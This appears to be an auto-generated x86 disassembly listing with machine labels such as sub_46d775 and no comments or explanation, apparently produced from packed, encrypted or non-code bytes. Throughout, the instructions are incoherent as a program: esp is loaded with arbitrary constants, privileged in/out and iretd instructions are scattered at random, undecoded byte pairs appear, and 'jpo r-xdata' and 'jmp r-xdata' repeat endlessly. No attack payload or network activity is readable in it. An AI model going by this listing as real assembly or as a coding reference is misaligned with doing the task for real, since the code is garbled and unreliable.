jmp r-xdata
[ eax + 0x2f ]
sub_46d775
sub [ eax + 0x19 ] ah
shl [ ecx * 4 - 0x23fde730 ] 0xff
jmp r-xdata
jmp r-xdata
insb
mov esp 0x387ad62
and edx [ 0x7e831414 ]
jpo r-xdata
bound ebp [ ebp + 0x1551039b ]
adc al 0x14
push 0x4e83ab2f
pop esp
jpo r-xdata
in al 0x5c
fld [ edx ]
stc
int3
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
out dx al
fucomp st3
jmp r-xdata
jpo r-xdata
jmp r-xdata
mov cl 0x9c
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov ch 0xcc
jmp r-xdata
pushfd
fsubr [ ebx ]
stosd [ edi ]
and ch [ eax ]
jpo r-xdata
jpo r-xdata
pop ebx
dec esi
push cs
inc edx
jl r-xdata
and ch [ eax ]
jpo r-xdata
das
call 0xffffffffa09c33b4
adc al 0x5c
scasb [ edi ]
sbb edi [ ebx + 0x14184502 ]
adc al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
pop ss
jmp r-xdata
jpo r-xdata
add ecx [ edi ]
adc eax 0x831414
0x62bc7fa2 0x83ad
pop esp
loope r-xdata
in al 0x5c
jpo r-xdata
jpo r-xdata
push esp
inc ebx
mov ch bl
jmp sub_46d93f
jpo r-xdata
jpo r-xdata
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
push ebx
add bl [ esi - 0x19 ]
jmp sub_46d967
scasb [ edi ]
pop ss
jpo r-xdata
sub [ ebx - 0x50 ] bh
0x2ebebeb 0xcb40
jpo r-xdata
jmp r-xdata
push 0xaf62e72f
iretd
jmp r-xdata
[ eax + 0x2f ]
sub_46d786
bound ebp [ ebp + 0x14c503d3 ]
adc al 0x14
adc [ edx - 0x4380d73b ] 0x2
add [ eax ] edx
adc al 0x14
jpo r-xdata
add dh [ ebp + 0x7bebebcc ]
jpo r-xdata
pop ebx
int3
jpo r-xdata
jmp r-xdata
jpo r-xdata
push ss
adc al 0x14
add ah [ ebx ]
jmp r-xdata
in al 0x6f
cld
fsub st3
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
pushad
sub eax 0xebf11902
jmp r-xdata
jmp esp
jpo r-xdata
jmp r-xdata
stc
int3
jmp r-xdata
outsb
aas
push ss
adc al 0x14
mov ebx 0x3f5662b8
jpo r-xdata
bound esi [ esi + 0x233605b ]
jpo r-xdata

and al 0xca
jmp r-xdata
pop ebx
pushad
jpo r-xdata
xor eax [ edx ]
jpo r-xdata
add edx [ edx - 0x9 ]
jmp r-xdata
iretd
sub_46d788
rol [ ebx ] cl
lds edx [ esp + edx ]
adc al 0x83
xchg edx eax
lds ebp [ eax ]
jg r-xdata
jmp sub_46d73d
add al [ ecx ]
adc [ esp + edx ] dl
jpo r-xdata
add dh [ ebp + 0x7bebebcc ]
jpo r-xdata
pop ebx
int3
jpo r-xdata
jmp r-xdata
jpo r-xdata
push ss
adc al 0x14
add ah [ ebx ]
jmp r-xdata
in al 0x6f
cld
fsub st3
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
pushad
sub eax 0xebf11902
jmp r-xdata
jmp esp
jpo r-xdata
jmp r-xdata
stc
int3
jmp r-xdata
outsb
aas
push ss
adc al 0x14
mov ebx 0x3f5662b8
jpo r-xdata
bound esi [ esi + 0x233605b ]
jpo r-xdata

and al 0xca
jmp r-xdata
pop ebx
pushad
jpo r-xdata
xor eax [ edx ]
jpo r-xdata
add edx [ edx - 0x9 ]
jmp r-xdata
iretd
sub_46d80a
mov esp 0xebe8c502
jmp r-xdata
outsb
jpo r-xdata
jmp esp
jpo r-xdata
jmp r-xdata
aas
push ss
adc al 0x14
mov ebx 0x3f5662b8
push ss
adc al 0x14
add ah [ ebx ]
jmp r-xdata
outsb
jpo r-xdata
bound esi [ esi + 0x233605b ]
jpo r-xdata

and al 0xca
jmp r-xdata
pop ebx
pushad
jpo r-xdata
xor eax [ edx ]
jpo r-xdata
add edx [ edx - 0x9 ]
jmp r-xdata
iretd
sub_46d873
jpo r-xdata
salc
mov eax [ ecx ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
add ebx ebp
jmp sub_46d8da
arpl di di
bound esi [ esi + 0x233605b ]
jpo r-xdata

and al 0xca
jmp r-xdata
pop ebx
pushad
jpo r-xdata
xor eax [ edx ]
jpo r-xdata
add edx [ edx - 0x9 ]
jmp r-xdata
iretd
sub_46d8b1
int 0xea
jmp r-xdata
jpo r-xdata
jecxz r-xdata
dec esp
sub eax 0x3003a58c
jpo r-xdata
jmp r-xdata
xor eax [ edx ]
jpo r-xdata

and al 0xca
jmp r-xdata
add edx [ edx - 0x9 ]
jmp r-xdata
iretd
sub_46d8da
add al [ ebx + 0x7b141407 ]
jpo r-xdata
bound esi [ esi + 0x233605b ]
jpo r-xdata

and al 0xca
jmp r-xdata
pop ebx
pushad
jpo r-xdata
xor eax [ edx ]
jpo r-xdata
add edx [ edx - 0x9 ]
jmp r-xdata
iretd
sub_46d93d
insb
mov dl 0x75
adc al 0x14
jb r-xdata
adc al 0x14
jpo r-xdata
retn 0x141b
push ebx
add bl [ esi - 0x19 ]
jmp sub_46d967
scasb [ edi ]
pop ss
0x2ebebeb 0xcb40
sub_46d93f
jne r-xdata
jpo r-xdata
adc al 0x72
add al dl
sbb edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
bound esp [ esi - 0x72cb9fd1 ]
bound esi [ esi + 0x233605b ]
push ebx
add bl [ esi - 0x19 ]
jmp sub_46d967
scasb [ edi ]
pop ss
0x2ebebeb 0xcb40
and al 0xca
jmp r-xdata
xor eax [ edx ]
jpo r-xdata

add edx [ edx - 0x9 ]
jmp r-xdata
iretd
sub_46d9a6
out 0x2 eax
loopne r-xdata
jpo r-xdata
jmp r-xdata
scasb [ edi ]
pop ss
0x2ebebeb 0xcb40
pushad
pop es
mov edx 0x2bd8ab81
mov ebx 0xa666e981
pop ss
mov edx 0xf6202bb
adc al 0x14
in al 0x5c
lodsd [ esi ]
[ eax + 0x2f ]
cmpsb [ esi ] [ edi ]
sub_46d9b2
adc al 0xac
rcl [ eax + 0x3b6ee4c3 ] cl
jmp r-xdata
add ah al
loopne r-xdata
cmpsb [ esi ] [ edi ]
pop ss
mov edx 0xf6202bb
adc al 0x14
in al 0x5c
lodsd [ esi ]
[ eax + 0x2f ]
jmp j_sub_46da92
sub_46d9d6
sub ecx ebp
push 0x5902e903
jmp r-xdata
jmp r-xdata
in al 0x6e
cmp ebp ebx
jmp r-xdata
loopne r-xdata
jpo r-xdata
jmp r-xdata
scasb [ edi ]
pop ss
0x2ebebeb 0xcb40
pushad
pop es
mov edx 0x2bd8ab81
mov ebx 0xa666e981
pop ss
mov edx 0xf6202bb
adc al 0x14
in al 0x5c
lodsd [ esi ]
[ eax + 0x2f ]
cmpsb [ esi ] [ edi ]
sub_46d9fe
bound ebp [ esi - 0x3dfd4ce5 ]
shr bl 0xeb
jpo r-xdata
mov ebp 0xebdfaf03
jpo r-xdata
push 0xebcfcf97
in al 0x6f
and al 0x0
adc al 0x14
push 0xe4ebe394
outsd
in al dx
jmp r-xdata
jmp r-xdata
scasd [ edi ]
fucomip st3
lea esp [ edx - 0x42 ]
push ebx
pushad
cmp eax [ edx ]
mov esi 0x7bebebe4
jpo r-xdata
adc al 0x68
xchg edi eax
iretd
in al 0x6f
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
test eax 0x7b141405
outsb
jmp r-xdata
sub esp esp
outsd
mov ds cx
jmp r-xdata
bound ebp [ edi + 0x2b6ef3cf ]
in al 0x6f
xor [ eax ] eax
adc al 0x14
sub_46da40
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
add bh cl
fldpi
jmp r-xdata
bound ebp [ ebp + 0x109d039f ]
adc al 0x14
or [ edx ] 0xffffffe9
jpo r-xdata
jpo r-xdata
mov si 0x31f
leave
fsubp st3
jmp r-xdata
mov esp 0x393ad62
adc [ eax ] 0x14
adc al 0x83
rcr esp cl
aad 0x1f
mov esp 0xeb6f6d62
jmp r-xdata
sub al 0x5a
lahf
jpo r-xdata
adc al 0xbd
out 0x66 eax
outsb
pop es
push ss
adc al 0x14
mov ebx 0x66c7bc14
outsb
add edx [ edi ]
adc al 0x14
mov ebx 0xebe72302
jmp r-xdata
jmp r-xdata
fucomi st3
jmp r-xdata
jpo r-xdata
add ebx [ ebp - 0x7cebebf0 ]
or ch cl
sub ebx 0xfffffffb
jmp r-xdata
pushad
sub eax 0x7b7b28b5
jpo r-xdata
idiv edi
jpo r-xdata
jmp sub_46db28
jpo r-xdata
jpo r-xdata
jpo r-xdata
scasb [ edi ]
add esp [ eax - 0x52 ]
pop ds
bound ebp [ esi + 0x622bd807 ]
scasb [ edi ]
pop ds
fcom [ eax ]
lahf
push esi
psubusb mm4 [ edx ]
pushad
mov dh 0x1f
lodsd [ esi ]
sub_46da68
jpo r-xdata
das
out 0x62 eax
scasd [ edi ]
jpo r-xdata
bound ebp [ edi + 0x2b6ef3cf ]
jpo r-xdata
adc al 0x68
xchg edi eax
iretd
iretd
jpo r-xdata
xor [ eax ] eax
adc al 0x14
push 0xebcfcf97
in al 0x6f
and al 0x0
adc al 0x14
push 0xe4ebe394
outsd
in al dx
jmp r-xdata
outsb
sub esp esp
outsd
jpo r-xdata
in al 0x6f
jpo r-xdata
jpo r-xdata
test [ edx ] 0xebebcaaf
lea esp [ edx - 0x52 ]
sbb esi [ ebx - 0x143f3dfe ]
jmp r-xdata
jmp sub_46da8c
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
add bh cl
fldpi
jmp r-xdata
bound ebp [ ebp + 0x109d039f ]
adc al 0x14
or [ edx ] 0xffffffe9
jpo r-xdata
jpo r-xdata
mov si 0x31f
leave
fsubp st3
jmp r-xdata
mov esp 0x393ad62
adc [ eax ] 0x14
adc al 0x83
rcr esp cl
aad 0x1f
mov esp 0xeb6f6d62
jmp r-xdata
sub al 0x5a
lahf
jpo r-xdata
adc al 0xbd
out 0x66 eax
outsb
pop es
push ss
adc al 0x14
mov ebx 0x66c7bc14
outsb
add edx [ edi ]
adc al 0x14
mov ebx 0xebe72302
jmp r-xdata
jmp r-xdata
fucomi st3
jmp r-xdata
jpo r-xdata
add ebx [ ebp - 0x7cebebf0 ]
or ch cl
sub ebx 0xfffffffb
jmp r-xdata
pushad
sub eax 0x7b7b28b5
jpo r-xdata
idiv edi
jpo r-xdata
jmp sub_46db28
jpo r-xdata
jpo r-xdata
jpo r-xdata
scasb [ edi ]
add esp [ eax - 0x52 ]
pop ds
bound ebp [ esi + 0x622bd807 ]
scasb [ edi ]
pop ds
fcom [ eax ]
lahf
push esi
psubusb mm4 [ edx ]
pushad
mov dh 0x1f
lodsd [ esi ]
sub_46da9b
and eax 0x60ee0a2a
adc eax 0xe8e9042a
and al 0xe4
push ebp
shr eax 0x1
and al 0xd8
sbb ch [ ecx + 0xe6ee4a3 ]
adc al 0x14
adc al 0xb4
idiv edi
jpo r-xdata
jmp sub_46db28
jpo r-xdata
jpo r-xdata
jpo r-xdata
scasb [ edi ]
add esp [ eax - 0x52 ]
pop ds
bound ebp [ esi + 0x622bd807 ]
scasb [ edi ]
pop ds
fcom [ eax ]
lahf
push esi
psubusb mm4 [ edx ]
pushad
mov dh 0x1f
add bh cl
fldpi
jmp r-xdata
lodsd [ esi ]
lahf
jpo r-xdata
mov si 0x31f
leave
fsubp st3
jmp r-xdata
mov esp 0x393ad62
adc [ eax ] 0x14
adc al 0x83
rcr esp cl
aad 0x1f
mov esp 0xeb6f6d62
jmp r-xdata
add ebx [ ebp - 0x7cebebf0 ]
or ch cl
sub al 0x5a
sub ebx 0xfffffffb
jmp r-xdata
out 0x66 eax
outsb
pop es
push ss
adc al 0x14
mov ebx 0x66c7bc14
outsb
add edx [ edi ]
adc al 0x14
mov ebx 0xebe72302
jmp r-xdata
pushad
sub eax 0x7b7b28b5
jpo r-xdata
fucomi st3
jmp r-xdata
sub_46db07
jmp r-xdata
sub eax 0x636d62bc
jmp r-xdata
insd
outsd
jmp r-xdata
pop edx
mov esp 0x393ad62
adc [ eax ] 0x14
adc al 0x83
rcr esp cl
aad 0x1f
mov esp 0xeb6f6d62
jmp r-xdata
sub_46db25
jmp r-xdata
jmp r-xdata
add edx [ esp + edx ]
jpo r-xdata
mov esi 0xc2240209
jmp r-xdata
jpo r-xdata
add bh [ esi - 0x19 ]
jmp r-xdata
adc al 0x83
or ch cl
sub al 0x5a
add dh bh
fucomip st3
jmp sub_46dc0a
sbb [ eax - 0x519d724d ] 0x8d2bd811
bound ebp [ esi - 0x44199e9 ]
mov esp 0x393ad62
adc [ eax ] 0x14
adc al 0x83
rcr esp cl
aad 0x1f
mov esp 0xeb6f6d62
jmp r-xdata
sub_46db60
add edi [ eax + edx + 0x26831414 ]
daa
lahf
sub eax 0x636d62bc
jmp r-xdata
insd
outsd
jmp r-xdata
pop edx
mov esp 0x393ad62
adc [ eax ] 0x14
adc al 0x83
rcr esp cl
aad 0x1f
mov esp 0xeb6f6d62
jmp r-xdata
sub_46db70
jmp r-xdata
adc al 0x2
xor [ edx ] eax
adc al 0x14
jpo r-xdata
add dh bh
adc al 0xbd
mov [ edx ] 0x14140373
jpo r-xdata
mov esi 0xc2240209
jmp r-xdata
jpo r-xdata
add bh [ esi - 0x19 ]
jmp r-xdata
adc al 0x83
or ch cl
sub al 0x5a
add dh bh
fucomip st3
jmp sub_46dc0a
sbb [ eax - 0x519d724d ] 0x8d2bd811
bound ebp [ esi - 0x44199e9 ]
mov esp 0x393ad62
adc [ eax ] 0x14
adc al 0x83
rcr esp cl
aad 0x1f
mov esp 0xeb6f6d62
jmp r-xdata
sub_46db72
lodsd [ esi ]
adc [ esp + edx ] dl
add dh [ ecx ]
add dl [ esp + edx ]
jpo r-xdata
add dh bh
adc al 0xbd
mov [ edx ] 0x14140373
jpo r-xdata
mov esi 0xc2240209
jmp r-xdata
jpo r-xdata
add bh [ esi - 0x19 ]
jmp r-xdata
adc al 0x83
or ch cl
sub al 0x5a
add dh bh
fucomip st3
jmp sub_46dc0a
sbb [ eax - 0x519d724d ] 0x8d2bd811
bound ebp [ esi - 0x44199e9 ]
mov esp 0x393ad62
adc [ eax ] 0x14
adc al 0x83
rcr esp cl
aad 0x1f
mov esp 0xeb6f6d62
jmp r-xdata
sub_46db9d
pushad
scasb [ edi ]
adc esp [ edx - 0x52 ]
add esp [ eax - 0x52 ]
pop ds
bound ebp [ esi + 0x622bd807 ]
scasb [ edi ]
pop ds
fcom [ eax ]
lahf
push esi
psubusb mm4 [ edx ]
pushad
mov dh 0x1f
add bh cl
fldpi
jmp r-xdata
mov si 0x31f
leave
fsubp st3
jmp r-xdata
out 0x66 eax
outsb
pop es
push ss
adc al 0x14
mov ebx 0x66c7bc14
outsb
add edx [ edi ]
adc al 0x14
mov ebx 0xebe72302
jmp r-xdata
fucomi st3
jmp r-xdata
sub_46dc13
mov eax 0xebc2da02
jmp r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
mov esi 0xebef3e02
jmp r-xdata
mov ebp 0x23360d3
mov esp 0xb2ebebdb
jpo r-xdata
pushad
jpo r-xdata
cmp ecx [ ebp + 0x2d7be62 ]
sbb dl [ esp + edx ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
adc al 0x14
adc al 0x7b
jpo r-xdata
lea esp [ edx - 0x42 ]
shl [ eax + 0x13 ] 0x1
lea esp [ edx - 0x6a ]
pushad
xchg ebx eax
jpo r-xdata
bound esi [ esi + 0x1102b005 ]
out 0xeb al
jmp r-xdata
jmp r-xdata
sub esp esp
outsd
salc
jmp r-xdata
mov dl 0x6e
jpo r-xdata
add cl [ eax + 0x7bebebc9 ]
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jmp r-xdata
jpo r-xdata
pop bx
push ss
adc al 0x14
add ch [ ebp + ecx * 8 - 0x15 ]
jmp r-xdata
add [ ebp - 0x143575fe ] 0x7b7b7beb
scasb [ edi ]
inc ecx
adc al 0x9e
aaa
bound esi [ esi + 0x1b9e1433 ]
mov esp 0x1415d002
adc al 0x60
sbb eax [ edx ]
and ebx 0xffffffe9
jmp r-xdata
jmp r-xdata
mov cl cl
add ch [ edx + 0xf ]
jmp r-xdata
xchg esi eax
sti
scasb [ edi ]
pop ss
mov ebx 0xe79e14bc
mov eax 0x2dfbd14
imul ebp ebx 0xbd14ebeb
xlat
pushad
scasb [ edi ]
adc esi [ edx + eax + 0x14141125 ]
jpo r-xdata
sahf
sbb edi [ edx + eax + 0x141415d0 ]
pushad
bound ebp [ esi - 0x3293fdbf ]
jmp r-xdata
xchg esi eax
pop ss
jpo r-xdata
jpo r-xdata
pushad
mov cl 0x4
mov ah 0x6
mov esp 0x3bbad62
sti
sbb al 0x14
adc al 0x83
cmpsb [ esi ] [ edi ]
stc
hlt
jpo r-xdata
bound esi [ esi - 0x72cd9ff9 ]
outsb
in al 0x7f
sub esi [ eax + esi * 4 + 0x7b7b2822 ]
lea esp [ edx - 0x52 ]
xor eax 0xebe7cf02
jmp r-xdata
cmp eax 0xd1be628d
pushad
adc ecx [ ebp + 0x21b9662 ]
add al 0x14
jpo r-xdata
jmp r-xdata
add dl [ ebx - 0x4e141401 ]
lea esp [ edx - 0x42 ]
jne r-xdata
jpo r-xdata
adc al 0x60
jpo r-xdata
pushad
sub eax 0xebdbbc03
bound esi [ esi - 0x4f207e13 ]
lea esp [ edx - 0x4a ]
and edx [ esi ]
adc al 0x14
mov ebx 0x1417d602
adc al 0x3
sbb bl 0xeb
outsb
jpo r-xdata
jpo r-xdata
jpo r-xdata
xor eax 0x141f8202
adc al 0x7b
scasb [ edi ]
jecxz r-xdata
scasb [ edi ]
jpo r-xdata
dec ebx
mov ebx 0xcf032d60
jpo r-xdata
salc
pop ss
adc al 0x14
add eax [ eax - 0x4d141425 ]
outsb
sub esp esp
outsb
jmp r-xdata
scasd [ edi ]
mov ebx 0xebe1a002
jmp r-xdata
fsubr [ ebx ]
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
jpo r-xdata
pushad
sub eax 0xebc4cf03
jmp r-xdata
jpo r-xdata
jpo r-xdata
jecxz r-xdata
out dx eax
sbb ebp 0xb6628db0
jpo r-xdata
adc al 0x14
adc al 0x9e
unpcklps xmm7 [ ebx + ecx * 8 - 0x2de8519e ]
mov dh 0x17
add bh [ esi ]
loope r-xdata
adc al 0x2
push 0xf
add ecx edi
jpo r-xdata
jpo r-xdata
jpo r-xdata
sbb edi 0xb6628db0
fnsave [ eax - 0x12499d73 ]
jpo r-xdata
scasb [ edi ]
xor eax [ edx ]
dec edi
iretd
in eax dx
lea esp [ edx - 0x4a ]
jpo r-xdata
jpo r-xdata
adc al 0xbd
xlat
fsubr [ ebx ]
rcl [ esi + 0x2b7fe417 ] cl
mov ah 0xb0
and ch [ eax ]
jmp r-xdata
fucomi st3
jpo r-xdata
jpo r-xdata
outsb
jpo r-xdata
jpo r-xdata
test [ edx ] eax
mov cl dl
jmp r-xdata
add ah [ edi + 0x14 ]
adc al 0x14
jpo r-xdata
add edi [ ebx + ebx * 8 + 0x6eb2ebeb ]
sub_46dc8c
outsb
aas
push ss
jpo r-xdata
adc al 0xbd
shl [ eax + 0x33 ] cl
add dh al
sti
jmp r-xdata
adc al 0x60
jpo r-xdata
adc al 0x14
mov ebx 0x1414dd02
adc al 0x7b
jpo r-xdata
mov esp 0xb2ebebdb
jpo r-xdata
cmp eax 0xd1be628d
pushad
adc ecx [ ebp + 0x21b9662 ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x52 ]
xor eax 0xebe7cf02
jmp r-xdata
scasb [ edi ]
jecxz r-xdata
bound esi [ esi + 0x1102b005 ]
out 0xeb al
jmp r-xdata
jmp r-xdata
sub esp esp
outsd
salc
jmp r-xdata
mov dl 0x6e
jpo r-xdata
jpo r-xdata
add cl [ eax + 0x7bebebc9 ]
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
pop bx
push ss
adc al 0x14
add ch [ ebp + ecx * 8 - 0x15 ]
jmp r-xdata
add [ ebp - 0x143575fe ] 0x7b7b7beb
bound esi [ esi - 0x4f207e13 ]
lea esp [ edx - 0x4a ]
outsb
scasb [ edi ]
inc ecx
adc al 0x9e
aaa
bound esi [ esi + 0x1b9e1433 ]
mov esp 0x1415d002
adc al 0x60
adc al 0x14
adc al 0x7b
jpo r-xdata
sbb eax [ edx ]
and ebx 0xffffffe9
jmp r-xdata
add ch [ edx + 0xf ]
jmp r-xdata
xchg esi eax
sti
scasb [ edi ]
pop ss
mov ebx 0xe79e14bc
mov eax 0x2dfbd14
imul ebp ebx 0xbd14ebeb
xlat
pushad
scasb [ edi ]
adc esi [ edx + eax + 0x14141125 ]
jpo r-xdata
sahf
sbb edi [ edx + eax + 0x141415d0 ]
pushad
bound ebp [ esi - 0x3293fdbf ]
jmp r-xdata
jpo r-xdata
xor eax 0x141f8202
adc al 0x7b
xchg esi eax
pop ss
jpo r-xdata
jpo r-xdata
mov cl 0x4
mov ah 0x6
mov esp 0x3bbad62
sti
sbb al 0x14
adc al 0x83
cmpsb [ esi ] [ edi ]
stc
hlt
jpo r-xdata
dec ebx
mov ebx 0xcf032d60
jpo r-xdata
salc
pop ss
adc al 0x14
add eax [ eax - 0x4d141425 ]
outsb
sub esp esp
outsb
bound esi [ esi - 0x72cd9ff9 ]
and edx [ esi ]
adc al 0x14
mov ebx 0x1417d602
adc al 0x3
sbb bl 0xeb
outsb
in al 0x7f
sub esi [ eax + esi * 4 + 0x7b7b2822 ]
add al 0x14
jmp r-xdata
add dl [ ebx - 0x4e141401 ]
lea esp [ edx - 0x42 ]
jne r-xdata
pushad
sub eax 0xebc4cf03
jmp r-xdata
jpo r-xdata
pushad
sub eax 0xebdbbc03
adc al 0x14
adc al 0x9e
unpcklps xmm7 [ ebx + ecx * 8 - 0x2de8519e ]
mov dh 0x17
add bh [ esi ]
loope r-xdata
adc al 0x2
push 0xf
add ecx edi
jpo r-xdata
jpo r-xdata
scasb [ edi ]
xor eax [ edx ]
dec edi
iretd
scasb [ edi ]
jpo r-xdata
jmp r-xdata
scasd [ edi ]
mov ebx 0xebe1a002
jmp r-xdata
fsubr [ ebx ]
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
jecxz r-xdata
out dx eax
sbb ebp 0xb6628db0
jpo r-xdata
jpo r-xdata
jpo r-xdata
sbb edi 0xb6628db0
fnsave [ eax - 0x12499d73 ]
jpo r-xdata
in eax dx
lea esp [ edx - 0x4a ]
jpo r-xdata
jpo r-xdata
adc al 0xbd
xlat
fsubr [ ebx ]
rcl [ esi + 0x2b7fe417 ] cl
mov ah 0xb0
and ch [ eax ]
jmp r-xdata
fucomi st3
jpo r-xdata
jpo r-xdata
outsb
jpo r-xdata
jpo r-xdata
test [ edx ] eax
mov cl dl
jmp r-xdata
adc al 0x14
pushad
cmp ecx [ ebp + 0x2d7be62 ]
sbb dl [ esp + edx ]
jpo r-xdata
add ah [ edi + 0x14 ]
adc al 0x14
jpo r-xdata
xchg ebx eax
jpo r-xdata
add edi [ ebx + ebx * 8 + 0x6eb2ebeb ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
mov cl cl
pushad
sub_46dcbb
adc [ 0xffffffffbc06888b ] 0x62
lodsd [ esi ]
inc [ ebx ]
sbb [ edx ] dl
adc al 0x14
sub [ edi - 0x70 ] 0xfffffff5
mov esp 0x3f3ad62
push cs
adc dl [ esp + edx ]
and edi 0x44
sub [ edx - 0x44 ] bl
add dl [ esi - 0x3d ]
jmp r-xdata
sub_46dd8b
pop ebp
in eax dx
mov esp 0x1404af02
adc al 0x60
mov esp 0xb2ebebdb
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
bound esi [ esi + 0x1102b005 ]
out 0xeb al
jmp r-xdata
jmp r-xdata
sub esp esp
outsd
salc
jmp r-xdata
mov dl 0x6e
jpo r-xdata
pop bx
push ss
adc al 0x14
add ch [ ebp + ecx * 8 - 0x15 ]
jmp r-xdata
add [ ebp - 0x143575fe ] 0x7b7b7beb
add ch [ edx + 0xf ]
jmp r-xdata
xchg esi eax
sti
scasb [ edi ]
pop ss
mov ebx 0xe79e14bc
mov eax 0x2dfbd14
imul ebp ebx 0xbd14ebeb
xlat
pushad
scasb [ edi ]
adc esi [ edx + eax + 0x14141125 ]
jpo r-xdata
sahf
sbb edi [ edx + eax + 0x141415d0 ]
pushad
bound ebp [ esi - 0x3293fdbf ]
jmp r-xdata
mov cl 0x4
mov ah 0x6
mov esp 0x3bbad62
sti
sbb al 0x14
adc al 0x83
cmpsb [ esi ] [ edi ]
stc
hlt
xchg esi eax
pop ss
jpo r-xdata
jpo r-xdata
bound esi [ esi - 0x72cd9ff9 ]
outsb
in al 0x7f
sub esi [ eax + esi * 4 + 0x7b7b2822 ]
lea esp [ edx - 0x52 ]
xor eax 0xebe7cf02
jmp r-xdata
jmp r-xdata
add dl [ ebx - 0x4e141401 ]
lea esp [ edx - 0x42 ]
jne r-xdata
jpo r-xdata
pushad
sub eax 0xebdbbc03
bound esi [ esi - 0x4f207e13 ]
lea esp [ edx - 0x4a ]
and edx [ esi ]
adc al 0x14
mov ebx 0x1417d602
adc al 0x3
sbb bl 0xeb
outsb
jpo r-xdata
jpo r-xdata
xor eax 0x141f8202
adc al 0x7b
scasb [ edi ]
jpo r-xdata
dec ebx
mov ebx 0xcf032d60
jpo r-xdata
salc
pop ss
adc al 0x14
add eax [ eax - 0x4d141425 ]
outsb
sub esp esp
outsb
jmp r-xdata
scasd [ edi ]
mov ebx 0xebe1a002
jmp r-xdata
fsubr [ ebx ]
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
jpo r-xdata
pushad
sub eax 0xebc4cf03
jmp r-xdata
jpo r-xdata
jpo r-xdata
jecxz r-xdata
out dx eax
sbb ebp 0xb6628db0
jpo r-xdata
adc al 0x14
adc al 0x9e
unpcklps xmm7 [ ebx + ecx * 8 - 0x2de8519e ]
mov dh 0x17
add bh [ esi ]
loope r-xdata
adc al 0x2
push 0xf
add ecx edi
jpo r-xdata
jpo r-xdata
jpo r-xdata
sbb edi 0xb6628db0
fnsave [ eax - 0x12499d73 ]
jpo r-xdata
scasb [ edi ]
xor eax [ edx ]
dec edi
iretd
in eax dx
lea esp [ edx - 0x4a ]
jpo r-xdata
jpo r-xdata
adc al 0xbd
xlat
fsubr [ ebx ]
rcl [ esi + 0x2b7fe417 ] cl
mov ah 0xb0
and ch [ eax ]
jmp r-xdata
fucomi st3
jpo r-xdata
jpo r-xdata
outsb
jpo r-xdata
jpo r-xdata
test [ edx ] eax
mov cl dl
jmp r-xdata
cmp eax 0xd1be628d
pushad
adc ecx [ ebp + 0x21b9662 ]
adc al 0x14
adc al 0x7b
jpo r-xdata
adc al 0x14
pushad
cmp ecx [ ebp + 0x2d7be62 ]
sbb dl [ esp + edx ]
jpo r-xdata
add ah [ edi + 0x14 ]
adc al 0x14
jpo r-xdata
xchg ebx eax
jpo r-xdata
add edi [ ebx + ebx * 8 + 0x6eb2ebeb ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
mov cl cl
pushad
sub_46de1c
scasb [ edi ]
aaa
mov ebx 0xbc032d60
jpo r-xdata
scasb [ edi ]
jpo r-xdata
jmp r-xdata
scasd [ edi ]
mov ebx 0xebe1a002
jmp r-xdata
fsubr [ ebx ]
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
out dx eax
sbb ebp 0xb6628db0
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
xor eax 0x141f8202
adc al 0x7b
sbb edi 0xb6628db0
fnsave [ eax - 0x12499d73 ]
jpo r-xdata
salc
pop ss
adc al 0x14
add eax [ eax - 0x4d141425 ]
outsb
sub esp esp
outsb
bound esi [ esi - 0x72cd9ff9 ]
outsb
dec ebx
mov ebx 0xcf032d60
jpo r-xdata
in eax dx
lea esp [ edx - 0x4a ]
jpo r-xdata
pop bx
push ss
adc al 0x14
add ch [ ebp + ecx * 8 - 0x15 ]
jmp r-xdata
pushad
sub eax 0xebc4cf03
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0xbd
xlat
fsubr [ ebx ]
rcl [ esi + 0x2b7fe417 ] cl
mov ah 0xb0
and ch [ eax ]
add ch [ edx + 0xf ]
jmp r-xdata
xchg esi eax
sti
scasb [ edi ]
pop ss
mov ebx 0xe79e14bc
mov eax 0x2dfbd14
imul ebp ebx 0xbd14ebeb
xlat
pushad
scasb [ edi ]
adc esi [ edx + eax + 0x14141125 ]
jpo r-xdata
adc al 0x14
adc al 0x9e
unpcklps xmm7 [ ebx + ecx * 8 - 0x2de8519e ]
mov dh 0x17
add bh [ esi ]
loope r-xdata
adc al 0x2
push 0xf
add ecx edi
jpo r-xdata
fucomi st3
jpo r-xdata
mov cl 0x4
mov ah 0x6
mov esp 0x3bbad62
sti
sbb al 0x14
adc al 0x83
cmpsb [ esi ] [ edi ]
stc
hlt
xchg esi eax
pop ss
jpo r-xdata
scasb [ edi ]
xor eax [ edx ]
dec edi
iretd
jmp r-xdata
jpo r-xdata
in al 0x7f
sub esi [ eax + esi * 4 + 0x7b7b2822 ]
lea esp [ edx - 0x52 ]
